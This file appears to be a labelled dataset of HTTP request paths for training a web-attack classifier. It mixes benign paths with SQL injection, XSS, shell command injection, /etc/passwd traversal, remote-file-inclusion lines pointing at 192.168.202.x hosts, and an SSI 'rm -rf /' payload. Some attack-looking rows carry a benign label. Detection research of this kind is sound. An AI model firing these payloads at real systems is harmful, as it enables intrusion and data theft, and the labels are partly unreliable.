request	label
/ examples / jsp / jsp2 / el / sysinfo . cgi ? action = systemdoc & name = sysinfo_name_cmd_exec . nasl ; id 	1
/ 8394979 / 	0
/ crazy-moped / 	0
/ string / strings / parameters = 1 where 6494 = 6494 and 8463 = 2760 	1
/ auraview / 	0
/ string / strings / parameters = < img src = javascript : confirm ( string . fromcharcode ( 88 , 83 , 83 )  )  > 	1
/ power-brake / 	0
/ logo-lev2 / 	0
/ wedding_hair / 	0
/ string / modo = any  set-cookie :  + tamper = 5765205567234876235 & precio = 5059 & b1 = confirmar 	1
/ conmebol / 	0
/ string / strings / parameters = 1 '  )  and char ( 111 )  |  | char ( 77 )  |  | char ( 121 )  |  | char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null ) 	1
/ interface / login / login_frame . php ? site =  < script > alert (  ' owasp zap '  )  ;  <  / script > 	1
/ string / strings / parameters = torrent refojo 	0
/ cgi-home / windmail . exe 	1
/ string / strings / parameters = 1 '  )  ; select count (  *  )  from generate_series ( 1 , 5000000 )  and  (  ' tnvm '  like  ' tnvm 	1
/ 2124758 / 	0
"/ en-us / oie504mr . cfc ?  < script > document . cookie =  "" testtpby = 7052 ;  ""  <  / script > "	1
"/ help . php ? q =  ""  \ x0duname \ x09 > q76412123 \ x09 # "	1
/ avenger -bloodsports / 	0
/ dt05_web19 / 	0
/ string / strings / parameters = '  ;  str =  $  ( echo psujgu )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  / 	1
/ environment . php ? dir_prefix = http :  /  / 192 . 168 . 202 . 118 : 8080 / ghl9il ? 	0
/ string / modo = insertar & precio = 8998 & b1 = pasar + por + caja 	0
/ redsys / 404 . php ? redsys [ mypath ]  [ templates ]  = xxpathxx 	1
/ javascript / firewall . exe 	1
/ string / strings / parameters = >  < script >  ' confirm ( 0 )  ;  <  / script > 	1
/ string / strings / parameters = brittani 	0
/ string / strings / parameters = <  / div > 	1
"/ string / strings / parameters = ""  ]  < img src = 1 onerror = confirm ( 1 )  > "	1
/ string / strings / parameters = elefa_n7ina 	0
/ string / modo = insertar & precio = 6541 & b1 = pasar + por + caja / 	1
/ another_misstep / 	0
/ javascript / address . exe 	1
/ string / id = 1 & nombre = vino + rioja & precio = 39 & cantidad = 77 '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & b1 = aadir + al + carrito 	1
/ javascript / root . temp 	0
"/  ?  < script > document . cookie =  "" testswjp = 6010 ;  ""  <  / script > "	1
/ c ' hoario \ xc3 \ xb9 / 	1
/ string / strings / parameters = '  ; echo pyznpf $  (  ( 23 + 64 )  )  $  ( echo pyznpf ) pyznpf & 	1
"/ 8x6w469u . kspx ?  < meta http-equiv = set-cookie content =  "" testgfjr = 1286 ""  > "	1
/ nist-logo / 	0
/ 11801289 / 	0
/ string / strings / parameters = alhendn 	0
/ icon_wizards / 	0
/ string / strings / parameters = 1 )  )  as izvy where 2569 = 2569 ; begin user_lock . sleep ( 5 )  ;  end -- 	1
/ string / strings / parameters = 08968667r 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo fokdal )   &  &  str1 =  $  {  # str }   &  &   [  7 -eq  $  { str1 }   ]   &  &  sleep 1  \  \ 	1
"/ string / strings / parameters = &  & echo $ ifsaubgio $  (  ( 90 + 39 )  )  $  ( echo $ ifsaubgio ) aubgio "" "	1
/ string / id = 3 & nombre = jamn + ibrico & precio = 85 & cantidad = 53 & b1 = aadir + al + carrito 	0
/ install / config . php ? path = xxpathxx 	1
/ examples / jsp / jsp2 / el / anacondaclip . pl ? template =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / modo = insertar & precio = 9135 & b1 = confirmar 	0
/ crosscut / 	0
"/ help . php ? q =  ""  & sleep 10  # "	1
/ 187558 / 	0
/ examples / jsp / checkbox / lib / authform . inc . php ? path_pre =  / etc / passwd \ x00 	1
/ files / login . php3 ? err = hack & bsx_htxdir = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ? 	0
/  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  { file } 	1
/ bin / cgimail . exe 	1
/ usssnatf / 	0
/ cfitsio / 	0
/ javascript / labs . htm 	0
/ string / modo = entrar & login = cetraro & pwd = esquilero & remember = off & b1 = entrar 	0
/ javascript / true . war 	0
/ msg00236 / 	0
/ help . php ? q =  \ x0auname \ x09 > q86474454 \ x09 # 	1
/ enterdrama / 	0
/ string / modo = registro & login = sim & password = alzador & nombre = rut & apellidos = brzozowski & email = heston-bertran8 @ animextremist . qa & dni = 00423300p & direccion = plaa + mercadal ,  + 178 +  & ciudad = pulp & cp = 10880 & provincia = navarra & ntc = 848868523325038a & b1 = registrar 	1
/ string / strings / parameters = -7531 '  )  )  )  union all select 6900 , 6900 , 6900 , 6900 , 6900 , 6900 , 6900 , 6900 , 6900 # 	1
/ forum5486 / 	0
/ wmla_07sm / 	0
/ string / strings / parameters = |   [  7 -ne  $  ( echo mydvjm  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \ 	1
"/ igtf0zon . nsf ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ rw228598 / 	0
/ string / strings / parameters = gastoni @ stainless . iq 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo erxffg )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1 	1
/ 8x8blu1tr_006 / 	0
/ 265795 / 	0
"/ string / strings / parameters = < object type =  "" text / x-scriptlet ""  data =  "" http :  /  / jsfiddle . net / xle63 /   ""  >  <  / object > "	1
/ string / strings / parameters = lerma genis 	0
/ string / strings / parameters = 2935 	0
/ javascript / courses . js 	0
"/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo xgxykb )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  "" "	1
/ cfagcms / themes / default / index . php ? main = http :  /  / 192 . 168 . 202 . 96 : 8080 / llumt7msyau5y ? 	0
/ string / strings / parameters = 1 '  +  ( select  ' epza '  where 8994 = 8994 and make_set ( 3782 = 2428 , 2428 )  )  +  ' 	1
/ string / strings / parameters = -6665 '  )  )  )  or 4144 =  ( select upper ( xmltype ( chr ( 60 )  |  | chr ( 58 )  |  | chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  |  | chr ( 62 )  )  )  from dual )  and  (  (  (  ' winx '  =  ' winx 	1
/ javascript / arch . png 	0
/ examples / jsp / checkbox / index . php ? option = weblinks & itemid = 2 & catid = -1 union select 0 , 1 , 2 , 573614927975 , 4 , 5 , 6 , 7 , 8 , 9 , 10 , 11 -- 	0
/ 47usc230 / 	0
/ johnrichard / 	0
/ index-2x1 / 	0
/ string / strings / parameters = ladn 	0
/ insanev1 / 	0
/ beautifulbabedfuckedby14inchcocks / 	0
/ string / strings / parameters = dosenbac 	0
/ javascript / archive . exe 	1
/ 4361458 / 	0
/ string / strings / parameters = kellard @ todobetis . gf 	0
/ string / strings / parameters = |  ping -n 30 127 . 0 . 0 . 1  | 	1
/ string / modo = registro & login = matsuzak & password = de82ggic8 & nombre = hayde & apellidos = arrotcharen + doniz & email = kontou @ 15horas . wf & dni = 06384093y & direccion = calle + crucero-bouzas ,  + 185 ,  +  & ciudad = leaburu & cp = 32730 & provincia = teruel & ntc = 0473794196460600 & b1 = registrarany ?   set-cookie :  + tamper = 1041264011025374727 	1
/ 189072 / 	0
"/ string / modo = insertar & precio = 3212 <  !  --  # exec + cmd =  "" ls +  /  ""  --  >  & b1 = pasar + por + caja "	1
/ string / modo = entrar & login = aloin & pwd = 037r20n0do & remember = off & b1 = entrar 	0
"/ zln2hm2z . x ?  < meta http-equiv = set-cookie content =  "" testblcp = 8120 ""  > "	1
/ javascript / dmsdump . swf 	0
/ 1166198588 / 	0
/ string / strings / parameters = 1 )  )  )  and 6358 = 6735 	1
/ sethusc / 	0
/ string / id = 1 & nombre = jamn + ibrico & precio = 85 & cantidad = 64 & b1 = aadir + al + carrito 	0
/ string / modo = registro & login = tapani9 & password = ep9scopologio & nombre = seliem & apellidos = crous + zuta & email = kappeler-flick @ probandoo . mobi & dni = 82444604t & direccion = calle + capitan + palacios + 71 +  & ciudad = laguna + del + marquesado & cp = 12449 & provincia = la + rioja & ntc = 1595247568175334 & b1 = registrar 	0
"/ string / strings / parameters = 1 ""  ""  ; select  ( case when  ( 3855 = 3855 )  then 3855 else 1 /  ( select 0 )  end )  -- "	1
/ showproduct / 	0
/ jmock_header / 	0
/ recordings / libraries / adodb / server . php ? sql =  ' adodb_sql_sql_injection . nasl 	1
/ 138639 / 	0
/ 20060411-8 / 	0
/ cgi-sys / testcgi . exe 	1
/ javascript / webchat . so 	0
/ string / strings / parameters = borbn bascomta 	0
/ a24891-2004dec24 / 	0
/ 53c8aa29e15aac5a46d33d1097acd4ca / 	0
"/ string / strings / parameters = | echo $ ifsaisdyw $  (  ( 74 + 90 )  )  $  ( echo $ ifsaisdyw ) aisdyw "" "	1
/ 210538 / 	0
/ string / strings / parameters = 37523778z 	0
"/ zln2hm2z . exe ?  < meta http-equiv = set-cookie content =  "" testblcp = 8120 ""  > "	1
"/ dslpwt15 . nsf ?  < script > document . cookie =  "" testtkio = 5454 ;  ""  <  / script > "	1
"/ string / strings / parameters = 1 ""  ""  where 8241 = 8241 union all select null , null , null # "	1
/ javascript / bkup . bz2 	0
/ string / strings / parameters = | dir 	1
/ aamn-5ehsee / 	0
"/  ?  < meta http-equiv = set-cookie content =  "" testknim = 9383 ""  > "	1
/ string / str =  $  ( echo rpjjib )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  & 	1
/ string / strings / parameters = riega girme 	0
/ string / strings / parameters = -2500 '  )  )  )  union all select 6853 , 6853 , 6853 , 6853 -- 	1
/ string / strings / parameters = 1 ' unionselect1 , 2 , 3 	1
/ filosofitis / 	0
/ nypositions / 	0
/ string / strings / parameters = 34338 	0
/ string / strings / parameters = '   str =  $  ( echo jqnexe )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi 	1
/ string / strings / parameters = delpy_wrixon @ tecnoindomo . gs 	0
"/ string / strings / parameters = 1 ""  ""  )  where 9248 = 9248 ; if ( 6767 = 5022 )  select 6767 else drop function buii -- "	1
/ string / strings / parameters = 1 )  ; select dbms_pipe . receive_message ( chr ( 66 )  |  | chr ( 67 )  |  | chr ( 79 )  |  | chr ( 101 )  , 5 )  from dual and  ( 1491 = 1491 	1
/ string / strings / parameters = 4371 	0
/ string / strings / parameters = 6894 	0
/ string / strings / parameters = cotten @ comodepilarse . cm 	0
/ worldscreaturesrightcolu-16 / 	0
/ string / strings / parameters = |   [  1 -ne  $  ( echo sqhkcg  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  & 	1
/ string / strings / parameters = plza .  mirto ,  135 	0
/ uppedbytak / 	0
/ string / strings / parameters = 1 '  )  )  ; select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 and  (  (  ' xaoi '  =  ' xaoi 	1
/ string / strings / parameters = maeya 	0
/ string / strings / parameters = 1 '  |  |  ( select  ' xasp '  from dual where 4025 = 4025 and exp (  ~  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 8190 = 8190 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) x )  )  )  |  |  ' 	1
/ string / id = 3 & nombre = jamn + ibrico & precio = 100 & cantidad = 90 & b1 = aadir + al + carrito 	0
/ string / strings / parameters = 1 '  )  and 6240 =  (  ' qqpjq '  |  |  ( select case 6240 when 6240 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  )  and  (  ' ohqs '  like  ' ohqs 	1
/ 000032892 / 	0
/ md5_verify / 	0
/ javascript / entertainment . ep 	0
/ antivirus-software / 	0
/ 7o5qp766 . cgi ?  < script > cross_site_scripting . nasl <  / script > 	1
/ javascript / deny . xslt 	0
/ javascript / callout . csv 	0
/ nthome / 	0
/ examples / jsp / jsp2 / el / sojourn . cgi ? cat =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ scripts / rwcgi60 / showenv 	1
"/ d7ktpmcq . html ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ ddoworrl . exe ?  < script > document . cookie =  "" testvlau = 8517 ;  ""  <  / script > "	1
/ scripts /  ! pwds . txt 	1
/ string / modo = registro & login = bolly & password = 0a5o0trica & nombre = tefilo & apellidos = amenta & email = friedkin @ dubi . ye & dni = 62397798v & direccion = secretario + espino + 67 + 4 ? g & ciudad = san + cibrao + das + vias & cp = 26288 & provincia = albacete & ntc = 5800254897479094 & b1 = registrar 	0
/ yapcasia_2 / 	0
/ basketadds / 	0
/ bitser / 	0
/ 20050929_125919 / 	0
/ string / strings / parameters = -6368 )  )  union all select 4646 , 4646 , 4646 , 4646 , 4646 , 4646 , 4646 -- 	1
/ 9600147_edison_stirling_largest_solar / 	0
/ fitch-paradox / 	0
/ preview . php ? php_script_path =  @ rfiurl ? cmd = dir & php_script_path =  @ rfiurl ? 	1
"/ help . php ? q =  ""  & ping -w 7000 -n 1 1 . 2 . 3 . 4 & rem "	1
/ string / strings / parameters = -6567 '  )  )  union all select 3217 # 	1
/ 748_949 / 	0
/ rubon86 / 	0
"/ string / strings / parameters = <  !  --  ie 6-8  --  >  < x  '  =  "" foo ""  >  < x foo =  '  >  < img src = x onerror = alert ( 1 )  /  /  '  >  <  !  --  ie 6-9  --  >  <  !   '  =  "" foo ""  >  < x foo =  '  >  < img src = x onerror = alert ( 2 )  /  /  '  >  <  ?   '  =  "" foo ""  >  < x foo =  '  >  < img src = x onerror = alert ( 3 )  /  /  '  > "	1
/ executiveaircharter / 	0
/ javascript / ssl . sql 	0
"/ top . php ? stuff =  "" rm q69198385  # "	1
/ awstats / awstats . pl ? migrate =  | echo ; chmod 555  / tmp / urcppbumwm0 ; echo | awstats379091 . txt 	1
/ string / strings / parameters = 5525531016614315 	0
/ manager / index . php ? id = urjhxcl19w ' 	1
"/ string / id = 1 & nombre = vino + rioja & precio = 39 & cantidad = 42 <  !  --  # exec + cmd =  "" rm + -rf +  /  ; cat +  / etc / passwd ""  +  --  >  & b1 = aadir + al + carrito "	1
/ arrow_gold9999999999997 / 	0
/ 3rdparty / phpmyadmin / export . php ? what =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ string / strings / parameters = argelio 	0
/ 0535422442242743 / 	0
/ string / strings / parameters = cerda de vigo 	0
/ string / modo = entrar & login = verge & pwd = 8en7dill3 & remember = on & b1 = entrar 	0
/ string / strings / parameters = 7677 	0
/ phpavt / 	0
/ ph2005092100952 / 	0
"/ en-us / oie504mr . pl ?  < script > document . cookie =  "" testtpby = 7052 ;  ""  <  / script > "	1
/ javascript / codec . msg 	0
/ string / strings / parameters = 1 )  )  )  and extractvalue ( 7982 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( elt ( 7982 = 7982 , 1 )  )  )  , 0x717a767a71 )  )  and  (  (  ( 1205 = 1205 	1
/ string / strings / parameters = & echo $ ifsscacns $  (  ( 89 + 8 )  )  $  ( echo $ ifsscacns ) scacns /  / 	1
/ string / strings / parameters = and if ( substring ( user (  )  , 1 , 1 )  >  = chr ( 97 )  , sleep ( 50 )  , 1 )  -- 	1
/ string / strings / parameters = 40151 	0
/ string / strings / parameters = 1 )  union all select null , null , null , null , null , null , null , null , null , null -- 	1
/ string / modo = registro & login = crabe & password = largar & nombre = itziar & apellidos = pellizza + echevarra & email = ehrlich . selwyne @ ebaz . ba & dni = 88194085x & direccion = torre-pacheco + 35 ,  +  & ciudad = clariana + de + cardener & cp = 07460 & provincia = ourense & ntc = 4485457754707106 & b1 = registrar 	0
/ string / strings / parameters = 81e9604o6o 	0
/ string / modo = registro & login = richards & password = v0r7fica6i24 & nombrea = patricio & apellidos = de + sol + butticaz & email = junior @ esteticadayda . bo & dni = 75911188x & direccion = c /  + candeleria + 179 ,  +  & ciudad = sant + miquel + de + fluvi & cp = 13100 & provincia = valladolid & ntc = 5101892686215961 & b1 = registrar 	1
/ bin / fileseek2 . cgi ? foot =  & head =  ; cat  / etc / passwd | 	1
/ string / strings / parameters = flack @ asociaciondearquitectoslatinoamericanos . mobi 	0
/ sima_sm / 	0
/ handyspiele / 	0
/ topphotos_gwen / 	0
/ hooverphonic / 	0
/ string / str =  $  ( echo wajeou )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  # 	1
/ javascript / moved . exe 	1
/ the_fed / 	0
"/ string / strings / parameters = 1 ""  ""  and elt ( 4249 = 4249 , 7259 )  and  ""  "" kgtz ""  ""  like  ""  "" kgtz "	1
/ march-97 / 	0
/ string / strings / parameters = 1 %  '  )  )  )  ; select  ( case when  ( 4666 = 4666 )  then 1 else 4666 *  ( select 4666 from master .  . sysdatabases )  end )  -- 	1
/ string / strings / parameters = |  | echo $ ifsunkbia $  (  ( 84 + 96 )  )  $  ( echo $ ifsunkbia ) unkbia | 	1
/ 145317 / 	0
/ javascript / customer . tgz 	0
"/ string / strings / parameters = -4135 ""  ""  )  as leiz where 3582 = 3582 or 4144 =  ( select upper ( xmltype ( chr ( 60 )  |  | chr ( 58 )  |  | chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  |  | chr ( 62 )  )  )  from dual )  -- "	1
/ string / modo = entrar & login = orel & pwd = gu /  ' in_chado & remember = on & b1 = entrar 	1
/ javascript / vendors . csv 	0
/ suburbanplight / 	0
"/ string / strings / parameters = 1 %  ""  ""  )  )  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  else char ( 76 )  |  | char ( 65 )  |  | char ( 102 )  |  | char ( 72 )  end )  from  ( values ( 0 )  )  )  and  (  (  ""  ""  %  ""  ""  =  ""  "" "	1
/ string / modo = registro & login = marymarg & password = r04e50 & nombre = ronnie & apellidos = puigferrer + ulldemol & email = zurica @ zaya . sr & dni = 03301687z & direccion = calle + malva + 1 ,  + 4-h & ciudad = chagarca + medianero & cp = 37520 & provincia = burgos & ntca = 1272948221132397 & b1 = registrar 	1
/ mantra / 	0
/ manager / blog . cgi ? submit = viewfile & month = 01 & year = 2004 & file =  | cat  / etc / passwd | 	1
/ string / strings / parameters = boen 	0
/ bachman turner overdrive - the anthology / 	0
/ 1165685672310 / 	0
"/ 5qnlm5z2 . do ?  < script > document . cookie =  "" testsixi = 8451 ;  ""  <  / script > "	1
/ string / strings / parameters = -8504 where 3086 = 3086 or 1131 = 9188 # 	1
/ architectural-heritage1 / 	0
/ ns8933335475 / 	0
/ string / id = 1 & nombre = queso + manchego & precio = 39 & cantidad = 59 & b1 = aadir + al + carrito 	0
/ petenicely / 	0
/ inc / prepend . inc . php ? path =  @ rfiurl ? path =  @ rfiurl ? 	0
"/ zln2hm2z . pl ?  < script > document . cookie =  "" testblcp = 8120 ;  ""  <  / script > "	1
/ network-forensics / 	0
/ string / strings / parameters = saetero farrer 	0
/ string / strings / parameters = '   str =  $  ( echo rqfvas )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  / 	1
/ 7o5qp766 . idc ?  < script > cross_site_scripting . nasl <  / script > 	1
/ sl-6525 / 	0
/ examples / jsp / jsp2 / el / jgs_portal_statistik . php ? meinaction = themen & month = 1 & year = 1 ' 	1
/  < script > cross_site_scripting . nasl <  / script >  . exe 	1
/ javascript / space . exe 	1
/  .  \  /  \  .  \  .  \  /  \  .  \  .  \  /  \  .  \  .  \  /  \  .  \  .  \  /  \  .  \  .  \  /  \  .  \  .  \  /  \  .  \  .  \  /  \  .  \  { file } 	1
/ string / strings / parameters = tagamanent 	0
/ string / strings / parameters = . h0rner3r1 	0
/ string / modo = registro & login = ula & password = 62r3 . ejn & nombre = elisandro & apellidos = abenoza + esplugues & email = schwarzenegger @ cirugiaplasticacordoba . om & dni = any ?   set-cookie :  + tamper = 1041264011025374727 & direccion = jota + aragonesa + 15 + 1f & ciudad = espadaedo & cp = 18516 & provincia = alicante & ntc = 6708069843609931 & b1 = registrar 	1
/ family-colocation / 	0
/ examples / jsp / sessions / index . php ? template =  .  .  /  .  .  /  .  .  / loudblog / custom / config . php \ x00 	1
"/ zv8tv7h8 . pl ?  < script > document . cookie =  "" testcqwz = 9752 ;  ""  <  / script > "	1
/ dda2qr7j . cfc ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ qczkquis . cfc ?  < script > document . cookie =  "" testkwlg = 5591 ;  ""  <  / script > "	1
/ content / wlkjdoxswm . mp3 	0
"/ string / strings / parameters = -5539 ""  ""  )  union all select 6189 , 6189 , 6189 , 6189 , 6189 , 6189 , 6189 , 6189 , 6189 -- "	1
/ top . php ? stuff = 1417058034 	0
/ string / strings / parameters = 1 '  )  where 9381 = 9381 or elt ( 6272 = 6272 , sleep ( 5 )  )  -- 	1
/ 40462000 / 	0
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo wgvbbv )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  | 	1
/ pc . shtml 	0
/ string / strings / parameters = schucrenberg-oheaney3 @ testdevelcidad . info 	0
/ invisible man 105 106 / 	0
/ string / strings / parameters = 1051962151250020 	0
/ starshiptroopersv1 / 	0
/ arrogant / 	0
/ hac_flightsoff / 	0
/ string / strings / parameters = c4e32788ia 	0
/ string / strings / parameters = 66750565b 	0
/ servicecriterion / 	0
/ javascript / affiliate . csproj 	0
/ string / strings / parameters = calle pea 49 ,  9 ? b 	0
/ phpmyadmin / module . php ? module = osticket & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = masvidal canino 	0
/ ampol_billy / 	0
/ 1147772824_2 / 	0
/ spywaredb / 	0
/  .  .  \  .  .  \  \  .  .  \  .  .  \  \  .  .  \  .  .  \  \  .  .  \  .  .  \  \  { file } 	1
/ sub_div / 	0
/ help . php ? q =  '  & uname \ x09 > q13548493 \ x09 # 	1
/ enterprs_nav4 / 	0
/ string / strings / parameters = 55687401p 	0
"/ help . php ? q =  ""  \ x0auname \ x09 > q73265631 \ x09 # "	1
/ string / strings / parameters = 1 '  |  |  ( select  ' jbgg '  from dual where 1986 = 1986 union all select null , null , null , null , null , null , null , null , null , null # 	1
/ string / strings / parameters = ( 8266 = 8266 )  * 9900 	1
/ static /  /  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ etc / passwd 	1
/ 121006_dakotacwpressconf / 	0
/ stat / awstatstotals . php ? sort =  {  $  { phpinfo (  )  }  }  {  $  { exit (  )  }  } 	1
"/ string / strings / parameters = < img src =  "" jav &  # x09 ; ascript : confirm ( document . location )  ;  ""  > "	1
/ iso_multlingual / 	0
/ string / modo = registro & login = wambsgan & password = tollecer & nombre = quintiliana & apellidos = alburqueque + fraguas & email = petrie3 @ menorca . com . kp & dni = 58188584x & direccion = jaca + 75 +  & ciudad = roperuelos + del + pramo & cp = 12310 & provincia = murcia & ntc = 8187933615095972 & b1 = registrar 	0
/ examples / jsp / jsp2 / el / af . cgi ? _browser_out =  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  / etc / passwd 	1
/ cgi-bin / cgi / tseekdir . cgi ? location =  / etc / passwd \ x00 	1
/ gunnyermeyswebring3 / 	0
/ javascript / motd . py 	0
/ string / strings / parameters = guinea hinojar 	0
/ javascript / trailers . fcgi 	0
/ string / strings / parameters = landolfi ribas 	0
/ 137241 / 	0
/ 000026369 / 	0
/ string / strings / parameters = ; echo qhdgwh $  (  ( 99 + 66 )  )  $  ( echo qhdgwh ) qhdgwh ' 	1
/ string / strings / parameters = 1 /  *  *  / unionselect /  *  *  / 1 , pass , 3 ` a ` from ` users ` 	1
/ string / strings / parameters = de los cazadores ,  196 ,  1-b 	0
/ scripts / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 1511087781 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 -- 	1
/ ncr_closure / 	0
"/ fmnveedu . nsf ?  < script > document . cookie =  "" testgfbr = 7014 ;  ""  <  / script > "	1
/ string / strings / parameters = ;  str =  $  ( echo knetda )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  | 	1
/ string / strings / parameters = cassius 	0
/ string / strings / parameters = 38993479s 	0
"/ string / strings / parameters = < div id = xss style =  ""  "" background-image :  url ( javascript : alert (  ' xss '  )  )  ""  ""  > "	1
/ string / modo = entrar & login = lacoste & pwd = h9erc5 & remember = on & b1 = entrar 	0
/ 2145430 / 	0
/ string / strings / parameters = 40574017q 	0
/ string / strings / parameters = ; echo arxzsc $  (  ( 51 + 16 )  )  $  ( echo arxzsc ) arxzsc /  / 	1
/ string / strings / parameters = yepes @ enla . mg 	0
/ javascript / change . zip 	0
/ phpmyadmin / popup . php ? include_path =  / etc / passwd \ x00 	1
/ figura1 / 	0
/ libwpcg / 	0
/ 129387 / 	0
/ string / strings / parameters = 3006162765919932 	0
/ cover-large / 	0
"/ string / strings / parameters = ""  |   [  9 -ne  $  ( echo bltnik  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "" "	1
/ string / strings / parameters = make_set ( 6174 = 9734 , 1 ) 	1
"/  < script > document . cookie =  "" testcrcv = 6167 ;  ""  <  / script > "	1
/ h5sc3gxy . dll ?  < script > cross_site_scripting . nasl <  / script > 	1
/ 105595 / 	0
"/ if69ddo1 . do ?  < script > document . cookie =  "" testiabz = 5220 ;  ""  <  / script > "	1
/ um_suspensions / 	0
/ article3099544 / 	0
/ rn_librosparaninos / 	0
/ string / strings / parameters = yadhira 	0
/ string / id = 3 & nombre = vino + rioja & precio = 39 & cantidad = 32 & b1 = aadir + al + carrito 	0
/ string / modo = registro & login = gunn & password = d88ino & nombre = nuncia & apellidos = badell + macia & email = vydra @ sms24h . no & dni = 4b1319b30b2d & direccion = c /  + closa + de + torroja + s / n + 12-b & ciudad = loiu & cp = 12580 & provincia = asturias & ntc = 9649891877150082 & b1 = registrar 	1
